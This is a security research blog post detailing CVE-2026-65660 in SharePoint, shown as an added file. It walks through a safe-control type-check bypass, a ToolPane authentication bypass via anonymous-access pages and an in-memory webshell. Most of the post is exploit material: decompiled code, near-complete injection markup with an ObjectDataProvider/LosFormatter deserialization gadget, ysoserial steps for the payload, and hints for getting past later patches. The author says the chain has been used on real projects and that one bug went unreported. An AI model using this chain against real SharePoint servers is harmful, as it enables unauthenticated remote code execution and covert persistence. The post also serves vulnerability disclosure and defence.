@@ -1,0 +1,297 @@
+# extract: served via jina
+Title: SharePoint CVE-2026-65660: From Anonymous Access to Pre-Auth RCE via EditingPageParser Type-Check Bypass
+
+URL Source: https://blog.viettelcybersecurity.com/sharepoint_cve-2026-65660/
+
+Published Time: 2026-09-22T03:03:00.000Z
+
+Markdown Content:
+## **Brief**
+
+Hi, and welcome. In this blog post, I'll share details of `CVE-2026-65660`, another SafeControls bypass. While there are several way to bypass Safe Type check, you might wonder what is special in this blog. That is in-memory webshell technique and more importantly, this can combine with another bug to achieve RCE without any authentication. This issue affects all versions of SharePoint, including SharePoint 2013, 2016, 2019, and Subscription Edition (SE). I already used this for a few projects, this is real-world hack!
+
+If you are new to SharePoint bugs, check these writeup first:
+
+*   [https://i.blackhat.com/USA-20/Wednesday/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security-wp.pdf](https://i.blackhat.com/USA-20/Wednesday/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security-wp.pdf)
+*   [https://blog.viettelcybersecurity.com/sharepoint-toolshell](https://blog.viettelcybersecurity.com/sharepoint-toolshell)
+*   [https://code-white.com/blog/exploiting-asp.net-templateparser-part-1](https://code-white.com/blog/exploiting-asp.net-templateparser-part-1)&[https://code-white.com/blog/exploiting-asp.net-templateparser-part-2/](https://code-white.com/blog/exploiting-asp.net-templateparser-part-2/)
+
+## Bypassing Type-Check
+
+`ToolPane.GetPartPreviewAndPropertiesFromMarkup()` use `EditingPageParser.VerifyControlOnSafeList()` manytime to filter string when parse control. But in `ToolPane` logic, it will separate the Register markup and the Tag markup by `ServerElementMarkupSource`. Later, it will call `ToolPane.ParseRegisterDirectives()` to process the Register markup part, then append the processed Register markup with the Tag markup and use `TemplateParser` to parse control.
+
+```
+//Microsoft.SharePoint.WebPartPages.ToolPane.GetPartPreviewAndPropertiesFromMarkup()
+internal static MarkupProperties GetPartPreviewAndPropertiesFromMarkup( ) {
+//... code truncation
+     string source = webPartMarkup.Trim();
+      if (!source.StartsWith("<%"))
+      {
+        flag2 = false;
+        throw new WebPartPageUserException(WebPartPageResource.GetString("WebPartMarkupNotDeserialized"));
+      }
+      ServerElementMarkupSource elementMarkupSource = new ServerElementMarkupSource(source); //Separate the Register markup and Tag markup
+      ToolPane.ParseRegisterDirectives(elementMarkupSource.RegisterDirectiveBlob, pageUri, ref registerDirectiveDataList); //Process the Register markup
+//... code truncation
+      Microsoft.SharePoint.ServerWebApplication webApplication = new Microsoft.SharePoint.ServerWebApplication(manager.Web, manager.LimitedWebPartManager, pageUri);
+      documentDesigner = Microsoft.SharePoint.PageParser.CreateAndInitializeDocumentDesigner(pageUri.AbsolutePath, manager.Web, pageUri.AbsolutePath, registerDirectiveDataList, markupOption, (IServerWebApplication) webApplication);
+      IServerElementDesigner elementDesigner = (IServerElementDesigner) null;
+      string mwd = ToolPane.AddDummyZoneToMWD((string) null, documentDesigner, out elementDesigner);
+      IServerElementDesigner nestedElementDesigner = ((IServerNestableDocumentDesigner) documentDesigner).CreateNestedElementDesigner((IServerElementMarkup) elementMarkupSource, elementDesigner, 0, true, blockPropertyTraversal); //Append the processed Register markup with the Tag markup and parse control.
+      documentDesigner.OnLoadComplete(false);
+//... code truncation
+}
+```
+
+`EditingPageParser.VerifyControlOnSafeList()` will be called to verify the Tag markup with all Registered typename first. Then `EditingPageParser.VerifyControlOnSafeList()` will be called for every processed Register markup string. The problem lie at appending processed Register markup with the Tag markup process. While appending it will call `Microsoft.Web.Design.RegisterDirective.GetHtml()` to generate the processed Register markup string.
+
+```
+public void GetHtml(TextWriter sw, bool includeCodeAssembly)
+  {
+    sw.Write("<%@ Register");
+    string tagPrefix = this.TagPrefix;
+    if (tagPrefix != null && tagPrefix.Length > 0)
+    {
+      sw.Write(" TagPrefix=\"");
+      sw.Write(tagPrefix);
+      sw.Write("\"");
+    }
+    string tagName = this.TagName;
+    if (tagName != null && tagName.Length > 0)
+    {
+      sw.Write(" TagName=\"");
+      sw.Write(tagName);
+      sw.Write("\"");
+    }
+    string str = this.Namespace;
+    if (str != null && str.Length > 0)
+    {
+      sw.Write(" Namespace=\"");
+      sw.Write(str);
+      sw.Write("\"");
+    }
+    string assembly = this.Assembly;
+    if (assembly != null && assembly.Length > 0)
+    {
+      sw.Write(" Assembly=\"");
+      sw.Write(assembly);
+      sw.Write("\"");
+    }
+    else if (includeCodeAssembly && this.IsCustomControl)
+      sw.Write(" Assembly=\"__code\"");
+    string src = this.Src;
+    if (src != null && src.Length > 0)
+    {
+      sw.Write(" Src=\"");
+      sw.Write(src);
+      sw.Write("\"");
+    }
+    sw.Write(" %>");
+  }
+```
+
+As you can see, the logic is simple, just append the attribute value to a format without any check. Everytime it add attribute value, it will append double quotes `"` at the begin and at the end. BUT, the attribute value can have double quotes `"` and single quotes `'` too! We can inject double quotes `"` to attribute value and control the processed Register markup (like SQL injection).
+
+Althought after every `Microsoft.Web.Design.RegisterDirective.GetHtml()` call, it will then check the processed Register markup with `EditingPageParser.VerifyControlOnSafeList()`. But with only Register Directive, there is no control to check. For example we can inject another directive by use `Src` attribute value with single quotes `'` like this:
+
+```
+<%@ Register Tagprefix="asdf" tagname="test" Src='/_controltemplates/15/AclEditor.ascx" %&gt; &lt;%@ Register Tagprefix="publishingribbon" Namespace="System.Web.UI.WebControls" Assembly="System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" %&gt; &lt;%-- ' %>
+```
+
+Because `EditingPageParser.VerifyControlOnSafeList()` will be called to verify the Tag markup with all Registered typename first, then verify every processed Register markup string later. We can input any dangerouse namespace in the Register markup after the check but right before the parse control process. `EditingPageParser.VerifyControlOnSafeList()` will call `EditingPageParser.ValidateTypeNames()` which will filter all invalid namespace, this make the exploit harder. But we can split the register directive we want to inject, first part in the Register markup and the rest is in Tag markup by adding single quotes `'`, abusing the process of appending processed Register string with the Tag markup. The markup will be something like this:
+
+```
+<%@ Register Tagprefix="asdf" tagname="test" Src='/_controltemplates/15/AclEditor.ascx"  %&gt; &lt;%@ Register ignoreParentFrozen=&apos; ' %>
+
+< Update Tagprefix="" /> asdf ' Tagprefix="publishingribbon" Namespace="some dangerous namespace" %>
+```
+
+The `Src` attribute value will be decoded to `/_controltemplates/15/AclEditor.ascx" %> <%@ Register ignoreParentFrozen='`. It create another incomplete Register directive, which will passed `EditingPageParser.VerifyControlOnSafeList()` check. then it will append with the tag and become:
+
+```
+<%@ Register Tagprefix="asdf" tagname="test" Src="/_controltemplates/15/AclEditor.ascx" %> <%@ Register ignoreParentFrozen=' " %>< Update Tagprefix="" /> asdf '  Tagprefix="publishingribbon" Namespace="some dangerous namespace" %>
+```
+
+The `< Update Tagprefix="" />` is needed because `ServerElementMarkupSource.TagParser` require the first tag must have valid tag name and valid attribute. I added `ignoreParentFrozen` because in `TemplateParser.ProcessAttributes()` code, if the attribute name is `ignoreParentFrozen` and in Designer, it will skip that attribute and won't make the register directive fail.
+
+```
+//System.Web.UI.TemplateParser.ProcessAttributes()
+private string .ProcessAttributes()(string text, Match match, out ParsedAttributeCollection attribs, bool fDirective, out string duplicateAttribute)
+{
+    string strA = string.Empty;
+    attribs = TemplateParser.CreateEmptyAttributeBag();
+    CaptureCollection captures1 = match.Groups["attrname"].Captures;
+    CaptureCollection captures2 = match.Groups["attrval"].Captures;
+    CaptureCollection captureCollection = (CaptureCollection) null;
+//...code truncation
+    for (int i = 0; i < captures1.Count; ++i)
+    {
+      string input = captures1[i].ToString();
+      if (fDirective)
+        input = input.ToLower(CultureInfo.InvariantCulture);
+      Capture capture = captures2[i];
+      string s = capture.ToString();
+      string propName = string.Empty;
+      string propertyDeviceFilter = System.Web.UI.Util.ParsePropertyDeviceFilter(input, out propName);
+//...code truncation
+      else if (this.FInDesigner && StringUtil.EqualsIgnoreCase(propName, "ignoreParentFrozen")) //Ignore ignoreParentFrozen  attribute
+        input = (string) null;
+//...code truncation
+    return strA;
+}
+```
+
+The Callstack is:
+
+```
+RegisterDirective.GetHtml() in Microsoft.Web.Design, Microsoft.Web.Design.Server.dll
+TopLevelRegisterDirectiveCollection.GetHtmlCollection() in Microsoft.Web.Design, Microsoft.Web.Design.Server.dll
+RegisterDirectiveManager.GetRegisterDirectivesHtmlCollection() in Microsoft.Web.Design, Microsoft.Web.Design.Server.dll
+ReferenceManager.GetRegisterDirectives() in Microsoft.Web.Design, Microsoft.Web.Design.Server.dll
+ControlSerializer.GetDirectives() in System.Web.UI.Design, System.Design.dll
+ControlSerializer.DeserializeControlInternal() in System.Web.UI.Design, System.Design.dll
+ControlSerializer.DeserializeControl() in System.Web.UI.Design, System.Design.dll
+ControlParser.ParseControl() in System.Web.UI.Design, System.Design.dll
+DocumentDesigner.CreateElementDesigner() in Microsoft.Web.Design, Microsoft.Web.Design.Server.dll
+DocumentDesigner.Microsoft.Web.Design.Interop.IWebDocumentDesigner.CreateElementDesigner() in Microsoft.Web.Design, Microsoft.Web.Design.Server.dll
+ServerElement.Initialize() in Microsoft.Web.Design.Server, Microsoft.Web.Design.Server.dll
+ServerElement.InitializeChildElement() in Microsoft.Web.Design.Server, Microsoft.Web.Design.Server.dll
+ServerDocument.CreateNestedElementDesignerCore() in Microsoft.Web.Design.Server, Microsoft.Web.Design.Server.dll
+ServerDocument.Microsoft.Web.Design.Server.IServerNestableDocumentDesigner.CreateNestedElementDesigner() in Microsoft.Web.Design.Server, Microsoft.Web.Design.Server.dll
+ToolPane.GetPartPreviewAndPropertiesFromMarkup() in Microsoft.SharePoint.WebPartPages, Microsoft.SharePoint.dll
+```
+
+At this point we can add any directive and pass the check. But when `EditingPageParser` can't find the type name of the control, it will mark it as unsafe. Thankfully, when `EditingPageParser.VerifyControlOnSafeList()` check, it will call `EditingPageParser.InitializeRegisterTable()` which will automatically add some Tagprefix when check but won't appear when parse control. `publishingribbon` is one of them, that why I used it in the payload.
+
+We can create any class, but we only can find gadgets from get, set based or static parse function (visit [https://code-white.com/blog/exploiting-asp.net-templateparser-part-1/](https://code-white.com/blog/exploiting-asp.net-templateparser-part-1/)) because `DocumentDesigner` will check if the controls created are safe controls again, which mean we can't abuse asp.net lifecycle method like `OnInit`, `OnLoad`,…
+
+There is a method we can use to achieve RCE is `XamlServices.Parse()`. But to use it we must wrap it inside a generic wrapper, I use the famous `ExpandedWrapper`. To create a generic instance, we can just add full assembly name in `Namespace` attribute and skip the `Assembly`. The final markup will look like this (replace `{Payload}` part with LosFormatter serialized payload):
+
+```
+<%@ Register Tagprefix="asp" Namespace="System.Web.UI" Assembly="System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" %>
+<%@ Register Tagprefix="test" Namespace="System.Windows.Data" Assembly="PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35" %>
+<%@ Register Tagprefix="asdf" tagname="test" Src='/_controltemplates/15/AclEditor.ascx" %&gt; &lt;%@ Register ignoreParentFrozen=&apos; ' %>
+
+< Update Tagprefix="" /> asdf ' Tagprefix="publishingribbon" Namespace="System.Data.Services.Internal.ExpandedWrapper`2[[System.Xaml.XamlServices,System.Xaml,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35]],System.Data.Services,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089,a=" %>
+
+<asp:UpdateProgress ID="Update" DisplayAfter="10" runat="server">
+    <ProgressTemplate>
+        <div class="divWaiting">
+            <publishingribbon:MobilePanel ExpandedElement="&lt;ObjectDataProvider xmlns=&apos;http://schemas.microsoft.com/winfx/2006/xaml/presentation&apos; xmlns:x=&apos;http://schemas.microsoft.com/winfx/2006/xaml&apos; xmlns:sys=&apos;clr-namespace:System;assembly=mscorlib&apos; xmlns:wui=&apos;clr-namespace:System.Web.UI;assembly=System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&apos; ObjectType=&apos;{x:Type wui:LosFormatter}&apos;&gt; &lt;ObjectDataProvider.MethodParameters&gt; &lt;sys:String&gt;{Payload}&lt;/sys:String&gt; &lt;/ObjectDataProvider.MethodParameters&gt; &lt;ObjectDataProvider.MethodName&gt;Deserialize&lt;/ObjectDataProvider.MethodName&gt; &lt;/ObjectDataProvider&gt;" runat="Server">
+
+</publishingribbon:MobilePanel>
+        </div>
+    </ProgressTemplate> 
+</asp:UpdateProgress>
+```
+
+## In-memory webshell
+
+As you can see in the markup I written, it use `XamlServices.Parse()` with `ObjectDataProvider`. That confirm the usage of `PresentationFramework` assembly. The problem with `XamlReader.Parse()` of `PresentationFramework` is registry permission failed everytime `EventTrace` class is used. `XamlServices.Parse()` doesn't use `EventTrace`. To make `XamlServices` understand `ObjectDataProvider` namespace, we just need to load the `PresentationFramework` assembly, `XamlXmlReader` will read the xmlns and map the xaml tag. That is why I also wrap `ObjectDataProvider` inside `ExpandedWrapper`.
+
+We can copy-paste the `ActivitySurrogateDisableTypeCheckGenerator` xaml_payload from ysoserial and replace `ExpandedElement` with that. After that run `ActivitySurrogateSelectorGenerator` with `LosFormatter` formatter and replace `{Payload}` part in previous markup and we got the memshell.
+
+## ToolPane Authentication bypass
+
+`ToolPanePage` check authentication `OnInit`
+
+```
+public class ToolpanePage : WebPartPage
+{
+  protected override void OnInit(EventArgs e)
+  {
+    try
+    {
+      SPUtility.EnsureAuthentication();
+    }
+//...code Truncation
+  }
+}
+```
+
+But the problem is `ToolPane` control not only appear in `ToolPanePage`. `WebPartPage` when `OnInit` will call`ToolPaneCreationAndInitialization`.
+
+```
+protected override void OnInit(EventArgs e)
+{
+	base.OnInit(e);
+	if (base.Form != null)
+	{
+		SPWebPartManager sPWebPartManager = SPWebPartManager;
+		if (sPWebPartManager != null)
+		{
+			if (!Utility.CheckForCustomToolpane(this))
+			{
+				EmitHiddenWebPartZone();
+			}
+			sPWebPartManager.m_pageDisplayMode = sPWebPartManager.GetDisplayMode();
+			if (sPWebPartManager.Zones != null && sPWebPartManager.Zones.Count > 0)
+			{
+				ToolPaneCreationAndInitialization(base.Form, sPWebPartManager.m_pageDisplayMode);
+//...code truncation
+	}
+}
+```
+
+`ToolPaneCreationAndInitialization` will then call `CreateToolPane`,
+
+```
+private void ToolPaneCreationAndInitialization(HtmlForm form, WebPartDisplayMode displayMode)
+{
+//...code truncation
+	if (displayMode != WebPartManager.BrowseDisplayMode && displayMode != WebPartManager.DesignDisplayMode)
+	{
+		CreateToolPane(control);
+		CreatePlaceHolderCatalogZone(control);
+	}
+}
+```
+
+`CreateToolPane` do exactly what it name mean, It call `new ToolPane()` and add it to child controls.
+
+```
+private void CreateToolPane(Control ctrl)
+{
+	try
+	{
+		if (SPWebPartManager != null && SPWebPartManager.toolPane == null)
+		{
+			//...code truncation
+			ctrl.Controls.Add(new ToolPane());
+			ctrl.Controls.Add(_endTable);
+		}
+	}
+}
+```
+
+We can find any page that inherit `WebPartPage` and have `WebPartZone` then POST the `ToolPane` payload and skip the authentication check part. As you can see in the memshell picture the request is to `AddGallery.aspx` page, not `ToolPane.aspx`. `SPRequestModule` will check authentication before process request, so this only work with server allow anonymous to view pages. This is a standard setup for internet-facing servers where SharePoint sites are public, check [https://learn.microsoft.com/vi-vn/sharepoint/administration/manage-anonymous-access-for-a-web-application](https://learn.microsoft.com/vi-vn/sharepoint/administration/manage-anonymous-access-for-a-web-application) for more information.
+
+I have known about this for a long time but didn't report it. The June 9, 2026, patch fixed it, and I don't know which CVE it corresponds to. For servers installed with the July 14, 2026, patch, we can use another function that also parses templates in Design—for example, `GetWebPartPageConnectionInfo` of `WebPartPagesWebService` (you'll need to figure how to do this).
+
+## Conclusion
+
+These bug can combine together to achive Pre-Auth RCE and create memshell, which help attacker hit harder.
+
+`CVE-2026-65660` is fixed in August 11, 2026 patch. But `XamlServices.Parse()` still can create memshell. It also work on all SharePoint version including SharePoint 2013, 2016, 2019, and Subscription Edition (SE).
+
+Since August 11, 2026 patch `ToolPane.GetPartPreviewAndPropertiesFromMarkup()`is disable by default (T.T) but we still can find function that also parses templates in Design and bypass `EditingPageParser` check to exploit.
+
+For the Defender team, there have been many RCE vulnerabilities in SharePoint recently. Check for updates more frequently, even when there is no public PoC or alert of exploits in the wild. And of course, monitor and ready to act 24/7. There are some guys holding exploits and can attack at anytime.
+
+That’s the end of this blog, thank you for reading!
+
+Links/Buttons:
+- [](https://blog.viettelcybersecurity.com/author/duypnh/)
+- [About Us](https://blog.viettelcybersecurity.com/about-us/)
+- [News](https://blog.viettelcybersecurity.com/tag/news/)
+- [Threats](https://blog.viettelcybersecurity.com/tag/threat/)
+- [Researches](https://blog.viettelcybersecurity.com/tag/researches/)
+- [Subscribe](https://blog.viettelcybersecurity.com/sharepoint_cve-2026-65660/#/portal/signup)
+- [https://i.blackhat.com/USA-20/Wednesday/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security-wp.pdf](https://i.blackhat.com/USA-20/Wednesday/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security-wp.pdf)
+- [https://blog.viettelcybersecurity.com/sharepoint-toolshell](https://blog.viettelcybersecurity.com/sharepoint-toolshell)
+- [https://code-white.com/blog/exploiting-asp.net-templateparser-part-1](https://code-white.com/blog/exploiting-asp.net-templateparser-part-1)
+- [https://code-white.com/blog/exploiting-asp.net-templateparser-part-2/](https://code-white.com/blog/exploiting-asp.net-templateparser-part-2/)
+- [https://code-white.com/blog/exploiting-asp.net-templateparser-part-1/](https://code-white.com/blog/exploiting-asp.net-templateparser-part-1/)
+- [https://learn.microsoft.com/vi-vn/sharepoint/administration/manage-anonymous-access-for-a-web-application](https://learn.microsoft.com/vi-vn/sharepoint/administration/manage-anonymous-access-for-a-web-application)
+- [Enter your email Subscribe](https://blog.viettelcybersecurity.com/sharepoint_cve-2026-65660/#/portal)
+- [Powered by Ghost](https://ghost.org/)
